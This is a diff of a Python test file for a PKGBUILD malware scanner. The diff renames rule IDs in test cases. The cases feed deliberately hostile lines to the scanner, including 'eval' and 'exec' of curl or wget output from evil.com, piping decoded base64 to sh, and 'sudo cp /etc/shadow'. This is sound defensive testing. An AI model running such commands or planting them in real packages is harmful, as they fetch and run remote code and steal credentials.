@@ -92,47 +92,47 @@ add("R003-base64-decode-sh",
     header() + "base64 --decode <<< 'bWFsb2Npb3Vz' | sh\n",
     must_fire=["R003"], min_score=40)
 
-# ── R004: SKIP checksum variants ─────────────────────────────────────────────
+# ── H001: SKIP checksum variants ─────────────────────────────────────────────
 
-add("R004-skip-https-bare",
+add("H001-skip-https-bare",
     header() + "sha256sums=('SKIP')\nsource=('https://example.com/pkg.tar.gz')\n",
-    must_fire=["R004"], must_not_fire=["R012", "R013"], min_score=25)
+    must_fire=["H001"], must_not_fire=["R012", "R013"], min_score=25)
 
-add("R004-skip-https-named",
+add("H001-skip-https-named",
     header() + "sha256sums=('SKIP')\nsource=('https://github.com/user/repo/archive/v1.0.tar.gz')\n",
-    must_fire=["R004"], must_not_fire=["R012", "R013"], min_score=25)
+    must_fire=["H001"], must_not_fire=["R012", "R013"], min_score=25)
 
-add("R004-skip-git-justified",
+add("H001-skip-git-justified",
     header() + "sha256sums=('SKIP')\nsource=('git+https://github.com/user/repo.git')\n",
-    must_fire=["R004"], min_score=25)
+    must_fire=["H001"], min_score=25)
 
-add("R004-skip-git-pkgname",
+add("H001-skip-git-pkgname",
     header(pkgname="evil-pkg-git") + "sha256sums=('SKIP')\nsource=('https://github.com/user/repo.git')\n",
-    must_fire=["R004"], min_score=25)
+    must_fire=["H001"], min_score=25)
 
-add("R004-skip-validpgpkeys",
+add("H001-skip-validpgpkeys",
     header() + "validpgpkeys=('DEADBEEF1234')\nsha256sums=('SKIP')\nsource=('https://example.com/pkg.tar.gz.asc')\n",
-    must_fire=[], must_not_fire=["R004", "R012", "R013"])
+    must_fire=[], must_not_fire=["H001", "R012", "R013"])
 
-add("R004-skip-indexed",
+add("H001-skip-indexed",
     header() + "sha256sums=('SKIP' 'deadbeef' 'cafebabe')\n",
-    must_fire=["R004"], min_score=25)
+    must_fire=["H001"], min_score=25)
 
-# ── R005: empty checksum ─────────────────────────────────────────────────────
+# ── H002: empty checksum ─────────────────────────────────────────────────────
 
-add("R005-empty-checksum",
+add("H002-empty-checksum",
     header() + "sha256sums=()\n",
-    must_fire=["R005"], min_score=25)
+    must_fire=["H002"], min_score=25)
 
-# ── R006: http URL ───────────────────────────────────────────────────────────
+# ── H003: http URL ───────────────────────────────────────────────────────────
 
-add("R006-http-url",
+add("H003-http-url",
     header() + "source=('http://example.com/pkg.tar.gz')\n",
-    must_fire=["R006"], must_not_fire=["R012", "R013"], min_score=15)
+    must_fire=["H003"], must_not_fire=["R012", "R013"], min_score=15)
 
-add("R006-https-url",
+add("H003-https-url",
     header() + "source=('https://example.com/pkg.tar.gz')\n",
-    must_not_fire=["R006", "R012", "R013"])
+    must_not_fire=["H003", "R012", "R013"])
 
 # ── R007: .install modifications ─────────────────────────────────────────────
 
@@ -161,30 +161,30 @@ add("R008-ruby-e-url",
     header() + "ruby -c https://evil.com/payload.rb\n",
     must_fire=["R008"], min_score=25)
 
-# ── R009: sudo ────────────────────────────────────────────────────────────────
+# ── H004: sudo ────────────────────────────────────────────────────────────────
 
-# The sudo must be an added line *inside* an added build() body: R009 is
+# The sudo must be an added line *inside* an added build() body: H004 is
 # scoped to build/install functions, and a top-level sudo runs at source
-# time, which is a different claim (R129 territory, not R009's).
-add("R009-sudo-in-build",
+# time, which is a different claim (H077 territory, not H004's).
+add("H004-sudo-in-build",
     header() + "build() {\n+    sudo cp /etc/shadow /tmp/out\n+}\n",
-    must_fire=["R009"], min_score=40, max_score=70)
+    must_fire=["H004"], min_score=40, max_score=70)
 
-# ── R129: top-level (parse-time) fetch ───────────────────────────────────────
+# ── H077: top-level (parse-time) fetch ───────────────────────────────────────
 
 add("R010-curl-fetch",
     header() + "curl -O https://example.com/pkg.tar.gz\n",
-    must_fire=["R129"], min_score=25)
+    must_fire=["H077"], min_score=25)
 
 add("R011-wget-fetch",
     header() + "wget https://example.com/pkg.tar.gz\n",
-    must_fire=["R129"], min_score=25)
+    must_fire=["H077"], min_score=25)
 
-# ── R130: signing-key set changed (INFO fact) ────────────────────────────────
+# ── H078: signing-key set changed (INFO fact) ────────────────────────────────
 
-add("R014-validpgpkeys-added",
+add("H005-validpgpkeys-added",
     header() + "validpgpkeys=('DEADBEEF1234')\n",
-    must_fire=["R130"])
+    must_fire=["H078"])
 
 # ── D-series: dependency additions ───────────────────────────────────────────
 
@@ -194,13 +194,13 @@ add("R014-validpgpkeys-added",
 add("R015-depends-added",
     header() + "depends=('evil-pkg' 'another-pkg')\n")
 
-add("R016-makedepends-added",
+add("H006-makedepends-added",
     header() + "makedepends=('go' 'nodejs')\n",
     must_fire=["D003"], min_score=10)
 
 # Same cold-start silence as R015: an optdepends addition is reported, never
 # scored without corpus state.
-add("R016-optdepends-added",
+add("H006-optdepends-added",
     header() + "optdepends=('evil-pkg: for the malicious feature')\n")
 
 # ── R059: target-specific chmod +s ───────────────────────────────────────────
@@ -213,29 +213,29 @@ add("R017-chmod-sgid",
     header() + "chmod g+s /usr/bin/elevate\n",
     must_fire=["R059"], must_not_fire=["R017"], min_score=25)
 
-# ── R128: build function writes outside $pkgdir ──────────────────────────────
+# ── H076: build function writes outside $pkgdir ──────────────────────────────
 
-add("R018-ln-sf",
+add("H007-ln-sf",
     header() + "ln -sf /usr/bin/elevate /usr/local/bin/normal\n",
-    must_fire=["R128"], min_score=15)
+    must_fire=["H076"], min_score=15)
 
-# ── R131: suspicious environment variable ────────────────────────────────────
+# ── H079: suspicious environment variable ────────────────────────────────────
 
-add("R019-cflags-suspicious",
+add("H008-cflags-suspicious",
     header() + 'CFLAGS="-O2 -funroll-loops -march=native -fomit-frame-pointer"\n',
-    must_fire=["R131"], min_score=10)
+    must_fire=["H079"], min_score=10)
 
-# ── R039/R129: eval/exec ──────────────────────────────────────────────────────
+# ── R039/H077: eval/exec ──────────────────────────────────────────────────────
 
-add("R025-eval",
+add("H014-eval",
     header() + 'eval "$(curl -s https://evil.com/payload)"\n',
     must_fire=["R039"], min_score=30)
 
-add("R025-exec",
+add("H014-exec",
     header() + 'exec "$(wget -qO- https://evil.com/payload)"\n',
-    must_fire=["R129"], min_score=30)
+    must_fire=["H077"], min_score=30)
 
-# ── R004/R005: checksum changes ──────────────────────────────────────────────
+# ── H001/H002: checksum changes ──────────────────────────────────────────────
 
 add("R026-checksum-to-skip",
     """--- a/PKGBUILD
@@ -247,7 +247,7 @@ pkgver=1.0
 -sha256sums=('deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe1234')
 +sha256sums=('SKIP')
 """,
-    must_fire=["R004"], min_score=25)
+    must_fire=["H001"], min_score=25)
 
 add("R027-checksum-emptied",
     """--- a/PKGBUILD
@@ -259,7 +259,7 @@ pkgver=1.0
 -sha256sums=('deadbeef')
 +sha256sums=()
 """,
-    must_fire=["R005"], min_score=25)
+    must_fire=["H002"], min_score=25)
 
 
 # ── Controls ─────────────────────────────────────────────────────────────────
@@ -273,9 +273,9 @@ pkgname=benign-pkg
 -pkgver=1.0
 +pkgver=1.1
 """,
-    must_fire=[], must_not_fire=["R001", "R002", "R003", "R004", "R005",
-                                  "R006", "R007", "R008", "R009", "R012",
-                                  "R013", "R025", "R026", "R027"])
+    must_fire=[], must_not_fire=["R001", "R002", "R003", "H001", "H002",
+                                  "H003", "R007", "R008", "H004", "R012",
+                                  "R013", "H014", "R026", "R027"])
 
 
 def main():
